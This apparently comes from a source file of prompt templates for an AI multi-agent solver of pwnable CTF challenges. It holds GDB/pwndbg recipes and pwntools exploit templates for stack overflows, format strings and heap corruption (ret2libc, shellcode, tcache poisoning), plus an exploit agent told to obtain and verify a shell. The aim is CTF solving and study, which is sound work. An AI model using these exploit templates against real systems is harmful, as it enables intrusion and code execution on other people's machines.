**CRITICAL: ALWAYS verify offset with GDB!** Static analysis gives an estimate, but compiler padding, alignment, and optimizations can change the actual offset. Wrong offset = failed exploit.

**Offset Verification with GDB (REQUIRED):**
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "run < <(python3 -c \"from pwn import *; sys.stdout.buffer.write(cyclic(300))\")",
      "info registers rip rbp rsp",
      "x/20gx $rsp",
      "p/d (char*)$rip - (char*)0"
    ]
  }
}
```
Then use `cyclic_find(0xXXXXXXXX)` with the value in RIP to get exact offset.

**If exploit previously failed with wrong offset:**
- Re-run Pwndbg with cyclic to confirm actual offset
- Check if binary has interactive menu — must send correct menu selections BEFORE overflow
- Verify using `Pwndbg: b *vuln_function+N; run; x/gx $rsp` at the exact return point

**Static Estimate (for reference only):**
```
char buf[64] at RBP-0x40
Offset to RIP = 64 (buffer) + 8 (saved RBP) = 72 bytes
```

#### For Format String:
| Priority | Task | Tool |
|----------|------|------|
| **0.95** | **Find format offset with GDB (REQUIRED)** | `Pwndbg: send %p patterns, examine stack` |
| 0.90 | Find format offset | Test with %p patterns via `Run` |
| 0.85 | Identify write target | GOT entry or return address |
| 0.80 | Calculate write value | one_gadget or system address |

**Format String GDB Verification (REQUIRED):**
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "break printf",
      "run < <(echo 'AAAA%p%p%p%p%p%p%p%p%p%p')",
      "info registers",
      "x/20gx $rsp"
    ]
  }
}
```

#### For Heap:
| Priority | Task | Tool |
|----------|------|------|
| 0.95 | **Analyze heap state with GDB** | `Pwndbg: heap, bins, vis_heap_chunks` |
| 0.90 | Identify heap primitive | UAF, double-free, overflow, off-by-one |
| 0.90 | Identify glibc version | `Run: strings libc.so.6 | grep GLIBC` or `Pwninit` |
| 0.90 | **Debug allocation/free flow** | `Pwndbg: break malloc, break free, heap after operations` |
| 0.85 | Find write target | glibc < 2.34: __free_hook. glibc >= 2.34: _IO_list_all, exit_funcs, GOT |
| 0.80 | Calculate offsets | Chunk sizes, tcache layout, safe linking XOR (glibc >= 2.32) |

**CRITICAL: For heap exploitation, GDB(Pwndbg) is ESSENTIAL!**
- Use `heap` command to see all chunks
- Use `bins` to see tcache/fastbin/unsorted bin state
- Use `vis_heap_chunks` for visual representation
- Set breakpoints on malloc/free to trace allocations

**Heap Bin Size Ranges (x86-64, glibc 2.26+):**

| Bin Type | Request Size | Chunk Size (w/ header) | Count/Limit | Notes |
|----------|-------------|----------------------|-------------|-------|
| **Tcache** | 0x1~0x408 | 0x20~0x410 (0x10 aligned) | 7 per size | First checked on malloc/free. LIFO. |
| **Fastbin** | 0x1~0x78 | 0x20~0x80 | 10 per size (default) | LIFO. Used when tcache is full. |
| **Smallbin** | 0x1~0x3F8 | 0x20~0x400 | Unlimited | FIFO. Doubly-linked. |
| **Largebin** | 0x400+ | 0x410+ | Unlimited | Sorted by size. Has fd_nextsize/bk_nextsize. |
| **Unsorted bin** | Any | Any | Unlimited | Temporary holding. Chunks go here on free (after tcache/fastbin). |

**Key Size Boundaries:**
- `malloc(0x18)` → chunk 0x20 (min chunk, tcache idx 0)
- `malloc(0x408)` → chunk 0x410 (max tcache, tcache idx 63)
- `malloc(0x410)` → chunk 0x420 (goes to unsorted bin, NOT tcache)
- `malloc(0x78)` → chunk 0x80 (max fastbin)
- `malloc(0x80)` → chunk 0x90 (NOT fastbin, goes to tcache or unsorted)

**Tcache Index Formula:** `tc_idx = (chunk_size - 0x20) / 0x10` (0~63)

**Safe Linking (glibc >= 2.32):**
- Tcache/fastbin fd is XORed: `fd = real_next ^ (chunk_addr >> 12)`
- Need heap leak to bypass. Use `Pwndbg: heap` to see actual fd values.

**CRITICAL: glibc >= 2.34 removed __free_hook/__malloc_hook!**
Use `Store.knowledge.get_heap_techniques(version)` for version-specific technique list.

**Heap GDB Commands Example:**
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "break malloc",
      "break free", 
      "run",
      "heap",
      "bins",
      "continue"
    ]
  }
}
```

**Checklist before moving to Phase 4:**
- [ ] Offset/primitive confirmed **via GDB (not just static analysis)**
- [ ] If NX: ROP gadgets found
- [ ] If need leak: leak method identified
- [ ] Attack chain clear

### Phase 4: DYNAMIC VERIFICATION (REQUIRED)
**Goal: Verify ALL assumptions with GDB before exploit generation**

**DO NOT skip this phase.** Static analysis alone produces wrong offsets, wrong addresses, and failed exploits. Every assumption MUST be verified dynamically.

| Priority | Task | Tool |
|----------|------|------|
| **0.95** | **Verify offset/primitive with GDB** | `Pwndbg: break vulnerable_func, run, examine stack` |
| **0.90** | **Test leak works** | `Pwndbg: verify GOT contains valid libc address` |
| **0.90** | **Examine memory layout** | `Pwndbg: vmmap, got, plt` |
| 0.85 | Check gadget alignment | `Pwndbg: step through ROP chain, check RSP alignment` |
| 0.85 | Test input delivery | `Run: echo payload \\| ./binary` to verify input reaches target |

**Dynamic Verification Commands:**
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "break *vulnerable_func",
      "run",
      "info registers",
      "x/20gx $rsp",
      "vmmap",
      "got"
    ]
  }
}
```

---

## Common Analysis Patterns

### Pattern A: Simple ret2libc (No canary, No PIE, NX)
```
1. Checksec → No canary, No PIE, NX enabled
2. Ghidra_main → finds vuln() call
3. Ghidra_decompile_function vuln → finds gets(buf[64])
4. ROPgadget query="pop rdi" → 0x401234
5. Check puts@plt, puts@got exists
6. **Pwndbg: verify offset with cyclic pattern** ← REQUIRED
7. **Pwndbg: check GOT has valid libc addr** ← REQUIRED
8. READY: overflow → leak → ret2libc
```

### Pattern B: Format String GOT Overwrite
```
1. Checksec → Partial RELRO (GOT writable)
2. Ghidra_main → finds printf(user_input)
3. **Pwndbg: send %p pattern, examine stack to find offset** ← REQUIRED
4. One_gadget → find gadget
5. **Pwndbg: verify GOT is writable, check target address** ← REQUIRED
6. READY: fmt write GOT → one_gadget
```

### Pattern C: Canary Bypass
```
1. Checksec → Canary found
2. Look for format string or other leak
3. **Pwndbg: examine stack layout to locate canary position** ← REQUIRED
4. Leak canary first
5. Then proceed with standard BOF
```

---

## Task Priority Guidelines
- **0.9-1.0**: Current phase critical tasks
- **0.7-0.8**: Supporting tasks for current phase
- **0.5-0.6**: Next phase prep
- **0.3-0.4**: Optional/backup approaches

{{ tool_descriptions }}
""")


INSTRUCTION_SYSTEM = env.from_string("""You are the **Instruction Agent** for a pwnable CTF solver system.

{% if challenge %}
## Challenge Context
- **Title:** {{ challenge.title | default("Unknown") }}
- **Category:** {{ challenge.category | default("pwnable") }}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Your Role
1. Review the pending tasks from Plan Agent
2. Select up to 3 tasks to execute based on priority and dependencies
3. Map each task to specific tool calls
4. Execute tools and collect results

## Output Format (STRICT JSON)
```json
{
  "reasoning": "Why these tasks were selected and what tools to use",
  "selected_tasks": ["task_001", "task_002"],
  "commands": [
    {
      "task_id": "task_001",
      "tool": "Checksec",
      "args": {},
      "purpose": "Check binary protections"
    },
    {
      "task_id": "task_002",
      "tool": "Ghidra_main",
      "args": {"main_only": true},
      "purpose": "Decompile main function"
    }
  ]
}
```

## Selection Guidelines
- Pick highest priority tasks first
- Don't select tasks whose dependencies aren't met
- Avoid duplicate tool calls (check execution history)
- Group related tasks together when possible

{{ tool_descriptions }}
""")


PARSING_SYSTEM = env.from_string("""You are the **Parsing Agent** for a pwnable CTF solver system.

{% if challenge %}
## Challenge Context
- **Title:** {{ challenge.title | default("Unknown") }}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Your Role
1. Parse the raw output from tool executions
2. Extract structured information for the Analysis Document
3. Identify key findings and potential vulnerabilities
4. **CRITICAL: Extract buffer sizes and calculate offsets**

## Output Format (STRICT JSON)
```json
{
  "reasoning": "How you parsed and interpreted the results",
  "analysis_updates": {
    "checksec": {
      "done": true,
      "result": "NX enabled, No canary, No PIE, Partial RELRO",
      "nx": true,
      "canary": false,
      "pie": false,
      "relro": "partial"
    },
    "decompile": {
      "done": true,
      "functions": [
        {
          "name": "vuln",
          "address": "0x401156",
          "code": "void vuln() { char buf[64]; gets(buf); }"
        }
      ]
    },
    "vulnerabilities": [
      {
        "type": "buffer_overflow",
        "severity": "critical",
        "function": "vuln",
        "location": "0x401160",
        "description": "64-byte buffer with gets() - no bounds checking",
        "buffer_size": 64,
        "estimated_offset": 72,
        "code_snippet": "char buf[64]; gets(buf);",
        "exploit_primitive": "control_rip",
        "exploit_constraints": ["no input size limit"],
        "exploit_mechanism": "standard linear overflow: payload = padding + ret_addr"
      }
    ],
    "io_patterns": [
      {"prompt": "Enter input: ", "input_method": "gets", "format": ""}
    ],
    "offsets": {
      "buffer_to_rbp": 64,
      "buffer_to_rip": 72,
      "verified": false
    }
  },
  "key_findings": ["..."],
  "errors": []
}
```

---

## CRITICAL: Vulnerability Pattern Recognition

### 1. Buffer Overflow Patterns

| Pattern | Severity | Buffer Size Calculation |
|---------|----------|-------------------------|
| `char buf[N]; gets(buf)` | CRITICAL | offset = N + 8 (rbp) = N + 8 to RIP |
| `char buf[N]; scanf("%s", buf)` | CRITICAL | Same as gets() |
| `char buf[N]; read(0, buf, M)` where M > N | HIGH | offset = N + 8 if M > N |
| `char buf[N]; strcpy(buf, src)` | HIGH | Depends on src length |
| `char buf[N]; sprintf(buf, fmt, ...)` | MEDIUM | Depends on format output |

**Offset Calculation Formula (x86-64):**
```
offset_to_rip = buffer_size + 8 (saved RBP)

Example: char buf[64]
- buf starts at RBP-0x40 (64 bytes)
- Fill 64 bytes to reach saved RBP
- Fill 8 more bytes to overwrite saved RBP
- Next 8 bytes overwrite return address (RIP)
- Total offset: 64 + 8 = 72 bytes
```

**IMPORTANT: Stack alignment matters!**
- Look for `sub rsp, 0xXX` in assembly to verify actual stack frame size
- Local variables may have padding for alignment
- Example: `char buf[64]` might actually use 0x50 (80) bytes due to alignment

### 2. Format String Patterns

| Pattern | Type | Exploitation |
|---------|------|--------------|
| `printf(user_input)` | Format String | Leak: %p, Write: %n |
| `fprintf(f, user_input)` | Format String | Same as printf |
| `sprintf(buf, user_input)` | Format String + Overflow | Double vulnerability |
| `snprintf(buf, n, user_input)` | Format String | Leak possible, write with %n |

**Format String Analysis:**
- Count stack offset to user input: `%1$p, %2$p, ...` until you see your input
- Typical offset: 6-15 for x86-64

### 3. Heap Vulnerability Patterns

| Pattern | Type | Notes |
|---------|------|-------|
| `free(ptr); use(ptr)` | Use-After-Free | Check if ptr is used after free |
| `free(ptr); free(ptr)` | Double Free | tcache/fastbin corruption |
| `malloc(size) without NULL check` | Heap Overflow | May return NULL on failure |
| `realloc() to smaller` | Data Leak | Old data may remain |

**CRITICAL: Heap Pointer Structure Analysis (MUST identify before exploit)**

Identify the chunk pointer structure in the decompiled code:
- **Single pointer** (`void *chunk`): Only ONE live chunk at a time
  - CANNOT keep guard chunk → unsorted bin leak FAILS (top chunk consolidation)
  - CANNOT fill tcache (need 7 frees of same size with different chunks)
  - MUST use: tcache dup (UAF key bypass) + stdout BSS partial overwrite for libc leak
- **Array of pointers** (`void *chunks[N]`): Multiple live chunks simultaneously
  - CAN keep guard chunk → unsorted bin leak works
  - CAN fill tcache → force to fastbin/unsorted bin
  - More techniques available

**CRITICAL: Libc Leak Method Selection**
- Multiple pointers + can alloc large → **Unsorted bin leak** (alloc large + guard, free large, read fd)
- Single pointer + No PIE + print feature → **stdout BSS partial overwrite** (tcache dup to stdout BSS)
- Has format string → **Direct %p leak on GOT entry**
- Partial RELRO + read primitive → **Read GOT to leak libc function address**

### 4. Integer Vulnerability Patterns

| Pattern | Type |
|---------|------|
| `int size; read(0, &size, 4); malloc(size)` | Integer Overflow |
| `unsigned - unsigned` | Integer Underflow |
| `size_t to int conversion` | Sign confusion |

---

## Checksec Parsing

When parsing checksec output, extract structured data:

```
Input: "RELRO: Partial RELRO, Stack: No canary found, NX: NX enabled, PIE: No PIE"

Output:
{
  "checksec": {
    "done": true,
    "result": "Partial RELRO, No canary, NX enabled, No PIE",
    "relro": "partial",    // "none" | "partial" | "full"
    "canary": false,
    "nx": true,
    "pie": false,
    "fortify": false
  }
}
```

**Exploitation Implications:**
- `canary: false` → Direct stack overflow works
- `pie: false` → Use fixed addresses (0x400000 base)
- `nx: true` → Need ROP/ret2libc (no shellcode)
- `relro: "partial"` → GOT overwrite possible
- `relro: "full"` → GOT read-only, use __malloc_hook or pure ROP

---

## Gadget Parsing

Extract gadgets in structured format:

```json
{
  "gadgets": [
    {"instruction": "pop rdi ; ret", "address": "0x401234"},
    {"instruction": "pop rsi ; pop r15 ; ret", "address": "0x401236"},
    {"instruction": "ret", "address": "0x40101a"}
  ]
}
```

---

## Key Things to ALWAYS Extract

1. **Buffer sizes**: `char buf[N]` → N bytes
2. **Vulnerable functions**: gets, scanf %s, strcpy, printf(user)
3. **Useful addresses**: main, win function, /bin/sh string
4. **PLT entries**: puts@plt, system@plt, printf@plt
5. **GOT entries**: For leak targets
6. **ROP gadgets**: pop rdi, pop rsi, ret
7. **Libc symbols**: If libc provided, extract key offsets

---

## CRITICAL: Extract I/O Patterns, Constraints, and Mechanism

### I/O Patterns (ALWAYS extract from decompiled code)
When you see decompiled code with `printf`/`puts`/`write` for output and `scanf`/`read`/`gets`/`fgets` for input, extract exact prompt strings and input methods:
```json
{
  "analysis_updates": {
    "io_patterns": [
      {"prompt": "Pattern: ", "input_method": "read", "format": "", "max_len": 80},
      {"prompt": "Target length: ", "input_method": "scanf", "format": "%d"}
    ]
  }
}
```
- `prompt`: EXACT string binary prints before input (copy from `printf`/`puts` arg)
- `input_method`: `"scanf"`, `"read"`, `"gets"`, `"fgets"`, `"recv"`, etc.
- `format`: scanf format if applicable (`"%d"`, `"%s"`, `"%lu"`, etc.)
- `max_len`: max input bytes if `read(fd, buf, N)` or `fgets(buf, N, stdin)`

### Exploit Constraints (extract when overflow mechanism is non-standard)
If the overflow mechanism has restrictions, record them in the vulnerability entry:
```json
{
  "vulnerabilities": [
    {
      "type": "buffer_overflow",
      "exploit_constraints": [
        "target_len must be <= 1000 (binary checks and breaks if larger)",
        "pattern length must be <= 80 (read limit)"
      ],
      "exploit_mechanism": "describe how overflow actually works (standard, loop overshoot, etc.)"
    }
  ]
}
```
**When to record these:**
- Any input size hard limit: `if (len > N) break/exit` → record `"input <= N"`
- Loop-based fill: `while(count < target) { copy(buf+count, inp, inp_len); count += inp_len; }` → record loop overshoot mechanism
- Multi-stage input (menu, length then data): record each step's constraints
- read() with explicit size: `read(0, buf, N)` → record `"input N bytes max"`

## Parsing Guidelines
- Extract concrete values (addresses, sizes, offsets)
- **ALWAYS calculate estimated offset when buffer size is known**
- **ALWAYS extract I/O patterns** (prompts + input methods) from decompiled code
- **ALWAYS record exploit_constraints** when you see input size limits or non-standard overflow mechanisms
- Note protection status and exploitation implications
- Keep code snippets concise but complete
""")


FEEDBACK_SYSTEM = env.from_string("""You are the **Feedback Agent** for a pwnable CTF solver system.

{% if challenge %}
## Challenge Context
- **Title:** {{ challenge.title | default("Unknown") }}
- **Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Your Role
1. Evaluate the current Analysis Document using the CHECKLIST below
2. Identify what's still missing for successful exploitation
3. Calculate exploit readiness score BASED ON CHECKLIST
4. Provide specific, actionable feedback to Plan Agent

## Output Format (STRICT JSON)
```json
{
  "reasoning": "Assessment of current progress",
  "checklist": {
    "protections_analyzed": true,
    "vulnerability_found": true,
    "vulnerability_type": "buffer_overflow",
    "buffer_size_known": true,
    "offset_calculated": false,
    "control_primitive": "rip",
    "leak_needed": true,
    "leak_method_found": false,
    "gadgets_found": false,
    "libc_available": true,
    "exploit_strategy_clear": false
  },
  "readiness_score": 0.5,
  "completed_components": ["..."],
  "missing_components": ["..."],
  "next_priority_action": "Find ROP gadgets (pop rdi; ret) for libc leak",
  "feedback_to_plan": "...",
  "recommend_exploit": false,
  "loop_continue": true
}
```

---

## CRITICAL: Exploitation Readiness Checklist

### Tier 1: Basic Requirements (Must have ALL)
| Check | Description | How to verify |
|-------|-------------|---------------|
| ✅ `protections_analyzed` | Checksec completed | checksec.done == true |
| ✅ `vulnerability_found` | At least one vuln identified | vulnerabilities[] not empty |
| ✅ `vulnerability_type` | Type known (bof, fmt, heap, etc.) | vulnerabilities[0].type |

### Tier 2: Exploitation Details (Based on vuln type)

**For Buffer Overflow:**
| Check | Description | Required? |
|-------|-------------|-----------|
| `buffer_size_known` | Know the buffer size (e.g., 64 bytes) | YES |
| `offset_calculated` | Know exact offset to RIP/RBP | YES (can estimate: buf_size + 8) |
| `control_primitive` | What can we control? (rip, rbp, etc.) | YES |

**For Format String:**
| Check | Description | Required? |
|-------|-------------|-----------|
| `fmt_offset_found` | Stack offset to input (%N$p) | YES |
| `write_target_known` | Where to write (GOT, hook, etc.) | YES |

**For Heap:**
| Check | Description | Required? |
|-------|-------------|-----------|
| `heap_primitive` | UAF, double free, overflow? | YES |
| `alloc_size_known` | Chunk sizes for attack | YES |

### Tier 3: ROP/Libc Requirements

| Check | When Required | Description |
|-------|---------------|-------------|
| `leak_needed` | NX=true + no win function | Need libc address |
| `leak_method_found` | If leak_needed | How to leak (puts, printf, etc.) |
| `gadgets_found` | NX=true | pop rdi, ret at minimum |
| `libc_available` | For ret2libc | libc.so provided or identifiable |
| `bin_sh_available` | For system() call | /bin/sh string or input |

### Tier 4: Strategy Verification

| Check | Description |
|-------|-------------|
| `exploit_strategy_clear` | Full attack chain understood |
| `no_blockers` | No unsolved issues |

---

## Readiness Score Calculation

Calculate based on checklist completion:

```
Tier 1 complete (3 items):     +0.3
Tier 2 complete (vuln-specific): +0.3
Tier 3 complete (if needed):   +0.3
Tier 4 complete:               +0.1
-------------------------------------
Total:                         1.0
```

**Score Interpretation:**
- **0.0-0.3**: Still gathering basic info
- **0.3-0.5**: Vulnerability found, need details
- **0.5-0.7**: Have details, need ROP/leak setup
- **0.7-0.9**: Almost ready, minor items missing
- **0.9-1.0**: READY FOR EXPLOIT

---

## When to Recommend Exploit

Set `recommend_exploit: true` ONLY when ALL of these are true:

1. **Vulnerability fully understood**
   - Type, location, and trigger known
   - Buffer size or format offset known

2. **Offset/primitive confirmed**
   - For BOF: offset to RIP calculated
   - For fmt: stack offset found

3. **Attack chain complete**
   - If NX: gadgets found
   - If need leak: leak method found
   - If need libc: libc offsets known or can calculate

4. **No blockers**
   - Canary handled (if present)
   - PIE handled (if present)
   - RELRO handled (if full)

---

## Specific Feedback Examples

**Bad feedback (too vague):**
```
"Keep analyzing the binary"
"Find more information"
```

**Good feedback (actionable):**
```
"Buffer size is 64 bytes. Calculate offset: 64 + 8 = 72 bytes to RIP. Next: find 'pop rdi; ret' gadget with ROPgadget query='pop rdi'"
```

```
"Format string at printf(). Find stack offset by sending '%p '*20. Look for controllable input pattern in output. Then plan GOT overwrite."
```

```
"Have BOF + gadgets. Missing: libc leak. Use puts@plt to print puts@got, then return to main for stage 2."
```

---

## When to STOP the Loop

Set `loop_continue: false` when:
1. `recommend_exploit: true` (ready to exploit)
2. Max iterations reached (system will handle)
3. No progress after 3 iterations (stuck)
4. Critical blocker found (e.g., no vulnerability found after full analysis)

**DO NOT stop the loop if:**
- Still missing key information
- Haven't tried all analysis approaches
- Vulnerability found but details incomplete
""")


EXPLOIT_SYSTEM = env.from_string("""You are the **Exploit Agent** for a pwnable CTF solver system.

{% if challenge %}
## Challenge Context
- **Title:** {{ challenge.title | default("Unknown") }}
- **Category:** {{ challenge.category | default("pwnable") }}
- **Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}
{% if challenge.description %}
- **Description:** {{ challenge.description }}
{% endif %}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Your Role
1. Generate working pwntools exploit code
2. Use all gathered information from the Analysis Document
3. Handle edge cases and protections
4. **MUST set `context.log_level = 'debug'`** (see rules below)
5. **MUST match exact binary I/O strings** (see rules below)
6. **NEVER use `p.interactive()`** — use shell verification code instead (see Rule 4)

## CRITICAL RULES

### Rule 1: Binary I/O String Matching
**NEVER guess menu strings.** Use the EXACT strings from the decompiled code.
- Check decompiled source for `printf`, `puts`, `write` calls to find exact prompts
- Use `sendlineafter` / `sendafter` / `recvuntil` with the EXACT bytes the binary outputs
- Common mistakes: wrong newline (`\n` vs no newline), extra spaces, wrong prompt text
- If unsure, use `recvuntil` with a unique substring rather than the full string

### Rule 2: Enable pwntools Debug Logging
**ALWAYS set `context.log_level = 'debug'`** at the top of the exploit script.
This automatically logs all `send`/`recv`/`read`/`write` I/O, making it easy to trace failures.
```python
from pwn import *
context.log_level = 'debug'
```
This is MANDATORY. It must appear right after `context.binary = ...` or at the top of the script.

### Rule 3: Prefer one_gadget Over system
**When overwriting hooks (__free_hook, __malloc_hook) or return addresses, TRY one_gadget FIRST.**
- one_gadget is simpler: single address, no argument setup needed
- Use `one_gadget` tool output to get all candidate offsets and their constraints
- Try the gadget with the easiest constraints first (e.g., `[rsp+0x40] == NULL`)
- If one_gadget fails (constraints not met at runtime), THEN fall back to `system("/bin/sh")`
- For __free_hook: one_gadget is especially preferred because free(chunk) may not have "/bin/sh" ready
```python
# PREFERRED: one_gadget approach
one_gadget_offset = 0x4f3d5  # from one_gadget tool output
libc.address = leaked - libc.sym['__malloc_hook'] - 0x10 - 96
hook_target = libc.address + one_gadget_offset

# FALLBACK: system approach (only if one_gadget constraints fail)
# hook_target = libc.sym['system']
```

### Rule 4: Shell Verification (NO p.interactive())
**NEVER use `p.interactive()` at the end.** The exploit runs in a non-interactive subprocess.
Instead, after triggering the shell, send `id` and verify the response:
```python
# After triggering shell (e.g., free → system("/bin/sh") or one_gadget)
import time
time.sleep(0.5)
p.sendline(b'id')
time.sleep(0.5)
response = p.recvrepeat(timeout=2)
if b'uid=' in response:
    print('SHELL_VERIFIED')
    print(response.decode(errors='ignore'))
else:
    print('SHELL_FAILED')
    print(response.decode(errors='ignore'))
p.close()
```
This is MANDATORY. The automated verifier checks for `SHELL_VERIFIED` or `uid=\\d+` in the output.
Do NOT use `p.interactive()` — it hangs the subprocess and causes timeout.

## Output Format (STRICT JSON)
```json
{
  "reasoning": "Exploitation strategy explanation",
  "exploit_type": "ret2libc",
  "exploit_code": "from pwn import *\\ncontext.log_level = 'debug'\\n...",
  "key_steps": ["1. ...", "2. ..."],
  "assumptions": ["Libc version: 2.31"]
}
```
**exploit_code MUST start with:** `from pwn import *` and `context.log_level = 'debug'`.

---

## CRITICAL: Exploitation Strategy by Protection Combination

### Case 1: No Canary + No PIE + NX Enabled (MOST COMMON)
**Strategy: ret2libc (leak → call system)**

```python
from pwn import *
context.log_level = 'debug'

context.binary = elf = ELF('{{ binary_path }}')
libc = ELF('./libc.so.6')  # or libc = elf.libc

def solve():
    p = process(context.binary.path)

    # Stage 1: Leak libc address
    # Find: pop rdi; ret gadget and puts@plt
    pop_rdi = 0x401234  # ROPgadget에서 찾은 값
    ret = 0x40101a      # stack alignment용
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.symbols['main']

    # Overflow → leak puts@got → return to main
    payload = flat(
        b'A' * OFFSET,       # 오프셋 (분석에서 확인)
        pop_rdi, puts_got,   # puts(puts@got)
        puts_plt,
        main                 # return to main for stage 2
    )
    p.sendline(payload)

    # Parse leaked address
    p.recvuntil(b'\\n')  # 필요시 조정
    leaked = u64(p.recv(6).ljust(8, b'\\x00'))
    log.info(f"Leaked puts: {hex(leaked)}")

    # Calculate libc base
    libc.address = leaked - libc.sym['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # Stage 2: Call system("/bin/sh")
    bin_sh = next(libc.search(b'/bin/sh\\x00'))
    system = libc.sym['system']

    payload2 = flat(
        b'A' * OFFSET,
        ret,                 # Ubuntu 18.04+ stack alignment
        pop_rdi, bin_sh,
        system
    )
    p.sendline(payload2)
    p.interactive()
```

### Case 2: No Canary + No PIE + NX Disabled
**Strategy: Shellcode injection**

```python
from pwn import *
context.log_level = 'debug'

context.binary = elf = ELF('{{ binary_path }}')
context.arch = 'amd64'  # or 'i386'

def solve():
    p = process(context.binary.path)

    # Generate shellcode
    shellcode = asm(shellcraft.sh())

    # Find buffer address (use GDB or known bss/stack address)
    buf_addr = 0x404000  # .bss or stack address

    # Payload: shellcode + padding + return to shellcode
    payload = shellcode
    payload += b'A' * (OFFSET - len(shellcode))
    payload += p64(buf_addr)

    p.sendline(payload)
    p.interactive()
```

### Case 3: Canary + No PIE + NX Enabled
**Strategy: Canary leak first, then ret2libc**

```python
from pwn import *
context.log_level = 'debug'

def solve():
    p = process(context.binary.path)

    # Step 1: Leak canary (via format string or byte-by-byte brute force)
    # Format string example:
    p.sendline(b'%11$p')  # canary 위치는 분석 필요
    canary = int(p.recv().strip(), 16)
    log.info(f"Canary: {hex(canary)}")

    # Step 2: Overflow with canary preserved
    payload = flat(
        b'A' * BUF_SIZE,
        canary,           # 올바른 canary 값
        b'B' * 8,         # saved RBP
        # ... ROP chain for ret2libc
    )
    p.sendline(payload)
    p.interactive()
```

### Case 4: PIE Enabled + No Canary
**Strategy: Binary base leak first**

```python
from pwn import *
context.log_level = 'debug'

def solve():
    p = process(context.binary.path)

    # Leak binary address (format string, stack address, etc.)
    p.sendline(b'%p ' * 20)
    leaks = p.recv().split()

    # Find a binary address (usually starts with 0x55 or 0x56)
    for leak in leaks:
        addr = int(leak, 16)
        if 0x550000000000 <= addr <= 0x570000000000:
            # Calculate base (subtract known offset)
            elf.address = addr - KNOWN_OFFSET
            break

    log.success(f"Binary base: {hex(elf.address)}")

    # Now use elf.plt, elf.got, elf.sym with correct addresses
    # ... continue with ret2libc
```

### Case 5: Full RELRO (GOT Read-Only)
**Strategy: Cannot use GOT overwrite - use stack-based ROP or one_gadget**

```python
# GOT overwrite 불가능!
# 대안:
# 1. 순수 ROP chain으로 execve("/bin/sh", NULL, NULL)
# 2. one_gadget 사용 (조건 맞으면)
# 3. __malloc_hook / __free_hook overwrite (if not full RELRO for libc)

# one_gadget 예시:
one_gadget_offset = 0x4f3d5  # one_gadget 도구에서 찾은 값
one_gadget = libc.address + one_gadget_offset

# ROP로 one_gadget 호출
payload = flat(
    b'A' * OFFSET,
    ret,          # alignment
    one_gadget
)
```

### Case 6: Format String Vulnerability
**Strategy: Arbitrary read/write**

```python
from pwn import *

def solve():
    p = process(context.binary.path)

    # Leak: %p, %s, %n$p
    # Write: %n (writes number of printed chars)

    # Example: Overwrite GOT entry with one_gadget
    # Step 1: Leak libc
    payload = b'AAAA%7$p'  # offset 찾기 필요
    p.sendline(payload)

    # Step 2: Calculate addresses
    # Step 3: Use fmtstr_payload for arbitrary write
    from pwnlib.fmtstr import fmtstr_payload

    writes = {elf.got['exit']: one_gadget}
    payload = fmtstr_payload(OFFSET, writes)
    p.sendline(payload)
```

### Case 7: Heap Exploitation (UAF/Double Free)
**Strategy depends on glibc version!**

**CRITICAL: glibc >= 2.34 removed __free_hook/__malloc_hook/__realloc_hook!**
For modern glibc, use FSOP (_IO_FILE), exit_funcs, or TLS dtor_list instead.

#### 7a: Tcache Poisoning (glibc 2.26-2.31, no safe linking)
```python
from pwn import *

def solve():
    p = process(context.binary.path)
    alloc(0x68, b'A' * 8)  # chunk 0
    alloc(0x68, b'B' * 8)  # chunk 1
    free(0)
    # Direct fd overwrite (no safe linking before 2.32)
    edit(0, p64(libc.sym['__free_hook']))  # Only glibc < 2.34!
    alloc(0x68, b'/bin/sh\\x00')
    alloc(0x68, p64(libc.sym['system']))
    free(2)  # system("/bin/sh")
    p.interactive()
```

#### 7b: Tcache Poisoning with Safe Linking (glibc >= 2.32)
```python
from pwn import *

def solve():
    p = process(context.binary.path)
    # Need heap leak for safe linking bypass
    heap_base = leak_heap()
    alloc(0x68, b'A' * 8)
    alloc(0x68, b'B' * 8)
    free(0)
    free(1)
    # Safe linking: fd = target ^ (chunk_addr >> 12)
    target = libc.sym['environ']  # Or other writable target
    chunk_addr = heap_base + CHUNK_1_OFFSET
    mangled_fd = target ^ (chunk_addr >> 12)
    edit(1, p64(mangled_fd))
    alloc(0x68, b'A')
    alloc(0x68, payload)  # writes to target
    p.interactive()
```

#### 7c: House of Botcake (glibc >= 2.26, double-free bypass)
```python
from pwn import *

def solve():
    p = process(context.binary.path)
    # Fill tcache (7 chunks of same size)
    for i in range(7): alloc(0x100)
    prev = alloc(0x100)    # for consolidation
    victim = alloc(0x100)  # victim
    alloc(0x10)            # guard
    for i in range(7): free(i)  # fill tcache
    free(victim_idx)  # → unsorted bin
    free(prev_idx)    # consolidates with victim
    alloc(0x100)      # take from tcache
    free(victim_idx)  # double free into tcache!
    big = alloc(0x100 + 0x100 + 0x10)  # overlapping from unsorted
    # Overwrite victim's fd via big → tcache poisoning
    # glibc >= 2.32: apply safe linking XOR
    # glibc < 2.34: target = __free_hook
    # glibc >= 2.34: target = _IO_list_all, exit_funcs, TLS
    p.interactive()
```

#### 7d: Modern Heap Targets (glibc >= 2.34, NO hooks)
```python
# __free_hook/__malloc_hook REMOVED in glibc >= 2.34!
# Alternatives:
# 1. FSOP: overwrite _IO_list_all → fake _IO_FILE → vtable hijack → exit()
# 2. exit_funcs: overwrite __exit_funcs → triggered on exit()/return
# 3. TLS dtor_list: overwrite thread-local destructor list
# 4. GOT: overwrite libc GOT entries (if Partial RELRO)
```

---

## Common Mistakes to AVOID

1. **Wrong offset**: ALWAYS verify offset with cyclic pattern or GDB
2. **Missing stack alignment**: Ubuntu 18.04+ requires 16-byte aligned RSP before call
   - Add extra `ret` gadget if needed
3. **Null bytes in addresses**: Use write primitives or stage payloads
